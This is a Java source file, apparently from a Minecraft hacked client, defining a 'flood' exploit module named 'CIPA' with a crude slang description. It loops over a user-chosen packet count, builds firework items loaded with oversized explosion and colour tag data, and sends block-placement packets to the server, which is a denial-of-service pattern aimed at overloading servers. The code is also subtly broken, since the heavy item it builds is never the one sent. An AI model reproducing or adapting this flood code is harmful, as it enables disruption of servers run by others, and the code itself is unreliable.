package wtf.norma.nekito.exploit.impl.flood;

import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;
import wtf.norma.nekito.exploit.Exploit;
import wtf.norma.nekito.exploit.ExploitInfo;
import wtf.norma.nekito.exploit.ExploitType;
import wtf.norma.nekito.exploit.argument.Argument;
import wtf.norma.nekito.helper.ChatHelper;

import java.util.Arrays;


@ExploitInfo(
        name = "CIPA",
        type = ExploitType.FLOOD,
        description = "spoko okok CIPA? "
)
/*
author @intexpression
 */


public class CIPA extends Exploit {
//

    public CIPA() {
        super(new Argument("packets", 0, Integer.class));
    }

    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        ItemStack firework = new ItemStack(Items.fireworks);
        for (int i = 0; i < packets; ++i) {
            NBTTagCompound tag2 = new NBTTagCompound();
            NBTTagCompound tag = new NBTTagCompound();
            NBTTagList list = new NBTTagList();
            NBTTagCompound expl = new NBTTagCompound();
            ItemStack fw = new ItemStack(Items.fireworks);
            int[] arr = new int[64];
            for (int k = 0; k < 1000; ++k) {
                Arrays.fill(arr, k + 1);
                expl.setIntArray("Colors", arr);
                list.appendTag(expl);
            }
            tag.setTag("Explosions", list);
            tag.setByte("Flight", (byte) 2);
            tag2.setTag("Fireworks", tag);
            fw.setTagCompound(tag2);
            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY - 2.0, mc.thePlayer.posZ), 1, firework, 0.0f, 0.0f, 0.0f));
        }
        ChatHelper.printMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
        }

}



